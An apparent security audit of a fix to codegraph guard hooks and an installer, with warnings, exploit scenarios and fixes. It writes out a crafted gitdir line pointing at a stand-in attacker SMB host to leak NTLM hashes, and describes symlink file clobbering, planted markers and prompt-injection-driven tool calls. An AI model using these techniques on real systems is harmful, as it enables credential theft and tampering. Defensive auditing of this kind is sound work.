# Security Audit: issue #259, the codegraph guard fails open (uncommitted change set on fix/259-codegraph-guard-fail-open)

Reviewer: security-auditor, 2026-11-05
Contract: `.claude/concepts/2026-11-05-codegraph-guard-fail-open.md` (approved, revision 5 + binding addendum)
Scope: `codegraph-first-guard.py`, `codegraph-turn-tracker.py`, `codegraph-turn-reset.py`, `addon.json`,
`auto_improve_finish_install.py` (permission insert, `--check`, released hashes, index note), `_project_paths.py`
(`worktree_own_root`), `_claude_paths.py` (re-export and inline copy).

Threat model used. The guard is a nudge. It is not a security boundary: the agent can always read through the
shell, and a same-user process can always edit any file the hooks touch. The findings below are about things that
cross a REAL boundary: another local user, a remote host, a file outside the session folder, or the user's
permission settings.

## BLOCKER

None. No path found that lets another local user, a remote party, or a crafted project make these hooks delete or
write outside the session folder under the default configuration, or that turns a refusal into a silent wider
permission.

## WARN

### W1. Every state write follows a link in the final path component
- `codegraph-first-guard.py:300-308` (`Session.write`: `open(self.path(name), "w")`), used for `availability.json`
  (`:553`) and `ticket-<fp>` (`:762`).
- `codegraph-turn-tracker.py:103-106` (`open(target, "w")` for `turn.json`).

Step 0 refuses a linked FOLDER, and `read_json` / `has_plain_file` refuse a linked FILE on read. The writes do not:
`open(..., "w")` follows a symlink or hard link named `availability.json`, `turn.json` or `ticket-<64 hex>` and
truncates the target with the caller's rights.

**Exploit scenario.** Needs a party that can create entries inside the victim's session folder. On POSIX that is
only the same user (the folder is `0700` and owner-checked), so no cross-user path exists there. On Windows there
is no owner check (`hasattr(os, "getuid")` is false at `guard:276`, `tracker:73`, `reset:82, 148`). With `TMP`/`TEMP`
pointed at a shared folder (CI agents, `C:\Temp`, a service account using `C:\Windows\Temp`), and a parent ACL that
lets other users write into subfolders, another user who can see the folder name plants
`availability.json -> C:\Users\victim\<file>` (file symlink: needs Developer Mode or the privilege). The next
guard run in the victim's session truncates and overwrites that file with the JSON cache. Session ids are UUIDs, so
the attacker needs to see the folder name, which a shared temp listing shows.

**Impact.** Clobber of a victim-writable file with a fixed JSON body. Low likelihood (non-default temp location),
real integrity impact when it lands.

**Fix.** Write state through one helper in all three hooks:
`fd = os.open(tmp_name, O_WRONLY|O_CREAT|O_EXCL|getattr(os, "O_NOFOLLOW", 0), 0o600)` on a random sibling name, write,
close, then `os.replace(tmp_name, final)`. `os.replace` replaces a link at the destination instead of writing
through it. Re-check `folder_usable()` right before the replace. On POSIX also open the folder once with
`O_DIRECTORY|O_NOFOLLOW` and use `dir_fd=` for the open, the remove and the replace, which closes the folder-swap
window too. Add a test that plants `availability.json` as a link (skip when `os.symlink` is refused, per the
contract's skip rule) and asserts the link target is unchanged.

### W2. No owner check on Windows: the session folder and the pruner trust whoever created the folder
- `codegraph-first-guard.py:265-278`, `codegraph-turn-tracker.py:58-75`, `codegraph-turn-reset.py:74-84, 140-167`.

The contract (Session folder row, I-5) scopes the owner test to POSIX, and the implementation matches it. The
consequence on a shared temp folder:
- another user pre-creates `auto-improve-codegraph-<key>` with a `turn.json` inside: the victim's gate opens with
  NO stderr line and NO log record (`turn-marker-present` is not announced, `guard:731-732`);
- the victim's pruner deletes another user's old folder when it holds only known names (harmless content, but a
  cross-user delete the contract says never happens).

**Impact.** Gate bypass by a third party without an audit record; cross-user deletes of known-name files. The gate
is a nudge, so this is a hardening gap, not a privilege gain.

**Fix (pick one).** (a) Put the session folders under a per-user parent: `%LOCALAPPDATA%\auto-improve-codegraph\`
on Windows, `$XDG_RUNTIME_DIR` or `tempfile.gettempdir()/auto-improve-codegraph-<uid>/` (created `0700`,
owner-checked) on POSIX. (b) Keep the location and on Windows compare the folder owner SID with the current user via
`ctypes` `GetSecurityInfo`/`GetTokenInformation`; treat "cannot tell" as unusable (step 0, logged). Either way, have
step 2 log once per session when it opens the gate from a marker the tracker did not write in this process tree
(for example, require `turn.json`'s `pid`/`ts` to be present and plausible), so a planted marker leaves a trace.

### W3. A `gitdir:` line is followed to any path, including a UNC host
- `_project_paths.py:640-650` (`worktree_own_root`), `_claude_paths.py:128-140` (inline copy),
  `codegraph-first-guard.py:351-379` (inline copy), consumed by `_main_candidate` (`guard:391-411`),
  `index_verdict` (`guard:429-451`), `server_verdict`/`_server_state_at` (`guard:484-533`) and the installer's
  `_codegraph_index_notes` (`auto_improve_finish_install.py:2551-2609`).

`os.path.join(folder, X)` returns X when X is absolute, so `gitdir: //attacker.example/share/.git/worktrees/x`
gives the Main checkout candidate `//attacker.example/share`. The guard then `lstat`s
`\\attacker.example\share\.codegraph` and opens `\\attacker.example\share\.mcp.json`,
`...\.claude\settings.json` and `...\.claude\settings.local.json`.

**Exploit scenario.** The victim extracts a "repro" archive (git clone cannot deliver a `.git` file; an archive,
a copied folder or a package can) whose root holds a `.git` FILE with that line, and starts a session in it. On the
first source Read, Windows authenticates to the attacker's SMB server and leaks a NetNTLMv2 hash for offline
cracking or relay. The same line also stalls the hook for the SMB timeout once per session.

**Mitigating fact.** `_git_file_kind` (`_project_paths.py:562-575`, pre-existing) and `git` itself already follow
the same line, so a session in such a folder leaks the hash anyway (Claude Code runs `git status` at session start).
This change adds two more automatic triggers. It does not create the class.

**Fix.** In `worktree_own_root` and both inline copies: read at most 4096 bytes (`fh.readline(4096)`), and return
`(F, None)` (undecidable) when the resolved gitdir is a UNC or device path (`\\`, `//`, `\\?\`, `\\.\` prefixes after
normalisation) or does not contain `/.git/worktrees/` or `/.git/modules/`. Apply the same refusal in
`_git_file_kind`. Keep the parity test pinning the copies. Add one row per refused form.

### W4. `mcp__codegraph__*` is a name-scoped, future-proof auto-approval written into the committed settings file
- `addon.json:37-39`, `_plan_settings_edit` (`auto_improve_finish_install.py`, allow branch), `_named_tool_findings`
  (`:2479-2490`), install skill `SKILL.md:80, 130, 176`.

What the entry does: every current AND future tool of ANY MCP server registered under the name `codegraph` (user
scope, local scope or a project `.mcp.json`) runs without a permission prompt. The grant binds to a server NAME, not
to an identity or a command. It lands in `<project>/.claude/settings.json`, which is normally committed, so it
applies to every clone. The install also REFUSES (`codegraph-tool-named`) a user who deliberately narrowed the grant
to one tool, which pushes them to widen it.

The preview shows the entry (the `permissions-allow` field, the unified diff and `_render_text`), and the user
approved writing it (Q4). The preview does not say what the entry means.

**Exploit scenario.** A later CodeGraph release adds a tool that writes or runs something (an index rebuild, a
config write), or a teammate's local `codegraph` server is a different program. The model calls it with no prompt.
A prompt injection in indexed source can drive those calls.

**Fix.**
- Add one sentence to the preview note and the install skill: "This lets every tool of any MCP server named
  `codegraph`, including tools added in later releases, run without asking. It is written to the project's
  committed `.claude/settings.json`."
- Downgrade `codegraph-tool-named` from a refusal to a finding in the preview, or let the user confirm keeping a
  narrower entry. Refusing to install until the user widens a permission is the wrong default for a permission
  control.
- Restrict manifest validation (`_read_addon_manifest`) so `permissions_allow` entries must have the form
  `mcp__<name>__*` or `mcp__<name>`, where `<name>` is one of the manifest's `mcp-server` prerequisites. Today any
  string passes (`:2066-2069`), so a future manifest edit could write `Bash(*)` and only a reviewer would catch it.

## NIT

- **N1. Unbounded `.git` read.** `fh.readline()` with no limit (`_project_paths.py:644`, `_claude_paths.py:133`,
  `guard:367`). A multi-GB `.git` file with no newline is read whole on every guard run until the cache holds. Use
  `readline(4096)` (covered by the W3 fix).
- **N2. Trailing-dot key collision on Windows.** `_SESSION_ID_RE` accepts a trailing `.`; Windows strips it, so
  keys `abc.` and `abc` share a folder. Host ids are UUIDs, so this is theoretical. Forbid a trailing `.` or space in
  the grammar, or always hash the id.
- **N3. The `cwd-` fallback key ignores the user.** Two users without a `session_id` in the same shared folder
  (`/srv/app`) compute the same key. The second gets the first's folder, fails the owner test and fails open
  (`state-unwritable`, logged). Fold the uid (POSIX) or user name into the hash. Relevant to hosts that do not send
  `session_id`; the repo also ships a Cursor manifest.
- **N4. Residual pruner window.** Between the re-check `lstat(folder)` (`reset:181`) and `os.remove(path)`
  (`reset:192`) a same-user (or, on a non-sticky shared folder, other-user) swap of the folder for a link makes the
  remove go through the link. Only files with whitelisted names can be hit. On POSIX, open the folder with
  `O_DIRECTORY|O_NOFOLLOW` and use `os.remove(name, dir_fd=fd)` and `os.rmdir` on the verified path. On Windows the
  window is accepted. The contract's tests cover the check-time swap, not this window.
- **N5. A notice flag is created before the record is written.** `announce` (`guard:884-888`) creates
  `logged-<reason>` and then calls `log_event`, which fails silently. If the log write fails, that reason is never
  logged again this session. Same-user tampering (planting `logged-subagent`) suppresses the record. Low value;
  write the record first, then the flag.
- **N6. `disabledMcpjsonServers` is read as "disabled" whatever the server's scope** (`guard:515`, mirroring
  `_mcp_server_state`). The host applies that key to `.mcp.json` servers only. A project settings file listing
  `codegraph` there, while the server is configured at user scope, makes the guard fail open (logged) although the
  tool works. A correctness gap kept by parity with the installer. Fix both together or record it.
- **N7. The marker stores 80 characters of the CodeGraph query** (`tracker:85-95`) in the temp folder. Usually
  harmless symbol names; on a shared temp folder see W2. Store only the tool name and the time.

## Checked and found sound

- Session key: the grammar forbids separators, `..` as a whole name and a leading `-`/`.`, and caps the length at
  128. The fixed prefix rules out reserved device names (`CON`, `NUL`). No path escape.
- Folder creation: `os.mkdir(..., 0o700)`; umask can only remove bits; POSIX owner and link check on every use; a
  pre-planted folder only causes a logged fail-open (step 0), as the contract accepts.
- Pruner: Delivery cleanup's link test (`lstat` + `S_ISLNK` + `FILE_ATTRIBUTE_REPARSE_POINT`), no `is_junction`;
  whitelist of names; regular, non-link files only; per-file re-check including the real-parent containment test;
  `os.rmdir` only, no `rmtree`; any mismatch keeps the folder. No path found that deletes outside a session folder
  except the N4 window.
- Retry ticket: SHA-256 over the tool name and the sorted canonical input; bound to the session (folder) and the
  identical call; consumed by `os.remove`, so a racing second use falls through to a fresh block. It is not secret
  and need not be: a forged ticket only buys one allow, and that allow is ALWAYS printed and logged as
  `retry-escape` with a 12-character fingerprint prefix. The quieter forgery is a planted `turn.json` (W2).
- Fail-open by decoy: a `.codegraph` folder with no `codegraph.db` is not an index; links are refused on both
  levels; a planted `codegraph.db` only keeps the gate (fail-closed); `index-other-tree` needs a real `commondir`
  layout and is announced and logged. No silent fail-open from planted project files apart from W2's marker.
- Log content: `log_event` gets the tool name, the reason and a fingerprint prefix; `file=None`. No file content,
  no full path, no settings values. The block message echoes at most 80 characters of the caller's own pattern back
  to the caller.
- Installer splice: the entry is encoded by `_inline_json`/`_block_json`. The self-check re-parses strictly,
  compares the result with the in-memory merge, and proves every byte outside the inserted ranges unchanged, so
  manifest text cannot inject JSON. A symlinked `settings.json` is refused (`os.path.islink`), linked write folders
  are refused, the plan hash covers the before and after bytes, the backup is written before the atomic replace,
  and an entry already listed adds nothing (idempotent). The manifest comes from a plugin root other than the
  project (`_separate_plugin_root`), not from the project being installed into.
- Released hashes: validated as lowercase 64-hex per known hook; they only widen the set of copies `addon-remove`
  may delete, and only on a folded-hash match.
- I-3 (no kill switch): no environment variable turns the guard off; `CLAUDE_PROJECT_DIR`, `TMP`/`TEMP`,
  `CLAUDE_CONFIG_DIR` and `HOME` only locate files.

## Verdict

SAFE TO MERGE: no blocker. W1 and W3 are cheap and should land in this pull request or as a tracked follow-up
before the next release. W2 and W4 need a decision by the user (temp location and owner check; how the preview
describes the grant and whether a narrower grant is refused).
